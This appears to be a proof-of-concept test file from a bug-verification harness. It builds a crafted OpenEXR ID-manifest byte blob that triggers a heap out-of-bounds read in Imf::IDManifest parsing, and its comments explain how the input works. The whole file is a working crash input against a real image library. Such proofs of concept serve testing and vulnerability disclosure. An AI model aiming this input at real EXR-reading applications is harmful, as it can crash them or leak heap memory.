// PoC for a heap out-of-bounds read in Imf::IDManifest parsing.
//
// Drives the public, IMF_EXPORT constructor
//   Imf::IDManifest(const char* data, const char* endOfData)
// (declared in <OpenEXR/ImfIDManifest.h>) with a crafted, in-contract
// uncompressed ID-manifest blob -- exactly the bytes that the public
// CompressedIDManifest path hands to IDManifest::init() after
// decompression, and that an application reading an EXR file's
// `idManifest` attribute parses.
//
// The blob is a *valid* manifest whose run-length-encoded string-index
// map references only a subset of the strings in the string list (a
// legitimately encodable situation: unreferenced strings simply keep
// their default mapping). A later manifest entry then names a string
// index that is in range for the string list but beyond the populated
// mapping table. On the resulting tree the mapping table is sized to the
// number of indices actually populated while the bound check uses the
// string-list size, so `mapping[stringIndex]` reads past the end of the
// `mapping` heap allocation -> AddressSanitizer heap-buffer-overflow.
//
// On the original batch (and on the base) the mapping table is sized to
// the full string list, so the same input parses cleanly; the program
// exits 0.
//
// Built as C++ (public C++ API); file kept as .c per harness convention.

#include <OpenEXR/ImfIDManifest.h>

#include <cstring>
#include <string>
#include <vector>

namespace
{

void
putU32 (std::vector<char>& b, unsigned int v) // little-endian, as Xdr stores
{
    b.push_back ((char) (v & 0xff));
    b.push_back ((char) ((v >> 8) & 0xff));
    b.push_back ((char) ((v >> 16) & 0xff));
    b.push_back ((char) ((v >> 24) & 0xff));
}

void
putByte (std::vector<char>& b, unsigned char v)
{
    b.push_back ((char) v);
}

} // namespace

int
main (void)
{
    std::vector<char> blob;

    // --- version field (must be 0) ---
    putU32 (blob, 0);

    // --- top-level string list: 3 strings -> "A", "B", "C" ---
    // layout: [u32 count][varint len0..lenN-1][string bytes...]
    // strings after the first are prefixed with a common-prefix length
    // byte (0 here -> no shared prefix).
    putU32 (blob, 3);  // numberOfStrings
    putByte (blob, 1); // len("A")           = 1
    putByte (blob, 2); // len("\0" + "B")     = 2
    putByte (blob, 2); // len("\0" + "C")     = 2
    putByte (blob, 'A');
    putByte (blob, 0);
    putByte (blob, 'B');
    putByte (blob, 0);
    putByte (blob, 'C');

    // --- RLE string-index mapping: one run (0,0) ---
    // references only string index 0, so the populated mapping table has
    // a single entry even though the string list has three.
    putU32 (blob, 1); // rleLength
    putU32 (blob, 0); // first
    putU32 (blob, 0); // last

    // --- manifest entries: 1 ---
    putU32 (blob, 1);

    // entry[0].channels: one string "c"
    putU32 (blob, 1);
    putByte (blob, 1);
    putByte (blob, 'c');

    // entry[0].components: one string "x" (components.size() == 1 so the
    // per-id component loop -- where the overread lives -- runs once)
    putU32 (blob, 1);
    putByte (blob, 1);
    putByte (blob, 'x');

    // entry[0].lifetime (1 byte)
    putByte (blob, 0);

    // entry[0].hashScheme (pascal string, length 0)
    putU32 (blob, 0);
    // entry[0].encodingScheme (pascal string, length 0)
    putU32 (blob, 0);

    // entry[0].storageScheme = 1 (32-bit ids), tableSize = 1
    putByte (blob, 1);
    putU32 (blob, 1);

    // id[0] (32-bit)
    putU32 (blob, 0);

    // component[0] string index = 2: in range for the 3-string list, but
    // beyond the single populated mapping entry.
    putByte (blob, 2);

    const char* data = blob.data ();
    const char* end  = blob.data () + blob.size ();

    try
    {
        Imf::IDManifest manifest (data, end);
        (void) manifest;
    }
    catch (...)
    {
        // Clean rejection of in-range input is a normal, safe outcome.
        return 0;
    }

    return 0;
}
